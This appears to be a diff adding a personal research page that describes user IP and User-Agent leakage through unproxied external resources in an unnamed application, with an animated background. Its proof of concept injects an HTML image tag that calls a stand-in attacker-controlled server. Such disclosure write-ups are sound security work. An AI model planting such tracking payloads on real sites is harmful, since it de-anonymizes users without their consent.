@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>IP Leakage via Unproxied Resources</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.7.0/p5.min.js"></script>
+
+  <style>
+    body { margin: 0; padding: 0; background: black; font-family: sans-serif; color: white; line-height: 1.6; }
+    canvas { position: fixed !important; top: 0; left: 0; z-index: -1; }
+    
+    /* Content Container */
+    .content {
+      position: relative;
+      z-index: 10;
+      max-width: 800px;
+      margin: 40px auto 100px;
+      padding: 40px;
+      background: rgba(0,0,0,0.7); /* Darker background for reading long text */
+      backdrop-filter: blur(5px);
+      border-radius: 10px;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+
+    /* Typography */
+    h1 { color: #4db8ff; margin-top: 0; }
+    h2 { border-bottom: 1px solid #444; padding-bottom: 10px; margin-top: 30px; }
+    p { color: #ddd; font-size: 1.05rem; }
+    code { background: #222; padding: 2px 6px; border-radius: 4px; font-family: monospace; color: #ff9999; }
+    pre { background: #111; padding: 15px; border-radius: 8px; overflow-x: auto; border: 1px solid #333; }
+
+    /* Back Button */
+    .back-btn {
+      display: inline-block;
+      margin-bottom: 20px;
+      color: #aaa;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+    .back-btn:hover { color: white; text-decoration: underline; }
+
+    /* X Button Style (Same as index) */
+    .x-follow { position: fixed; top: 20px; right: 20px; z-index: 30; font-size: 13px; color: #ccc; text-decoration: none; padding: 6px 14px; border-radius: 8px; background: rgba(0,0,0,0.35); backdrop-filter: blur(4px); border: 1px solid rgba(255,255,255,0.15); transition: 0.2s ease; }
+    .x-follow:hover { color: white; background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.35); }
+  </style>
+</head>
+
+<body>
+
+<a class="x-follow" href="https://x.com/robotics8n" target="_blank">follow me on X</a>
+
+<div class="content">
+  <a href="index.html" class="back-btn">← Back to Research</a>
+  
+  <h1>User IP Address Leakage via Unproxied External Resources</h1>
+  <p><em>Date: November 20, 2025</em></p>
+
+  <h2>Summary</h2>
+  <p>
+    During my recent analysis of [Target Name], I discovered that the application loads external resources (such as images or fonts) directly from third-party servers without proxying the request through the application's backend.
+  </p>
+
+  <h2>The Vulnerability</h2>
+  <p>
+    When a user visits the affected page, their browser automatically makes a request to the external URL. This reveals the user's <strong>Real IP address</strong> and <strong>User-Agent</strong> to the owner of that external resource.
+  </p>
+
+  <h3>Proof of Concept</h3>
+  <p>I injected the following HTML into the profile description:</p>
+  <pre><code>&lt;img src="http://attacker-controlled-server.com/pixel.png" /&gt;</code></pre>
+
+  <h2>Impact</h2>
+  <p>
+    This allows an attacker to de-anonymize users, potentially correlating their activity on the platform with their physical location or identity.
+  </p>
+</div>
+
+<script>
+  // Same Animation as Index
+  let f = 0;
+  function setup() { createCanvas(windowWidth, windowHeight, WEBGL); }
+  function windowResized() { resizeCanvas(windowWidth, windowHeight); }
+  function draw() {
+    background(0);
+    let w = PI / 6; let P = w * 3;
+    pointLight(255, 255, 255, 0, 0, 300);
+    rotateX(PI / 6); rotateY(f -= 0.01);
+    for (let x = 0; x < TAU; x += w) {
+      for (let y = 0; y < TAU; y += P) {
+        push(); rotateY(x); rotateX(f * 0.3);
+        push(); translate(0, 0, 180); torus(90, 12, 16, 8); pop();
+        pop();
+      }
+    }
+  }
+</script>
+
+</body>
+</html>
